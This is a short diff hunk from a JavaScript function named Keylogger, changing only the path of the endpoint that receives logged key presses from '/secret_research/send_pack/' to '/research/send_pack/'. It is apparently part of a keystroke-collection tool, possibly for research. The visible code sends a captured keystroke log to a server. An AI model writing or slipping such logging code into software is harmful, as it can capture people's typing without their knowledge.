@@ -30,7 +30,7 @@ function Keylogger(){
                 data: JSON.stringify(_obj.log)
             },
             //dataType: 'json',
-            url:'/secret_research/send_pack/',
+            url:'/research/send_pack/',
             success: function(){
                 _obj.log = {
                     key_press: [],
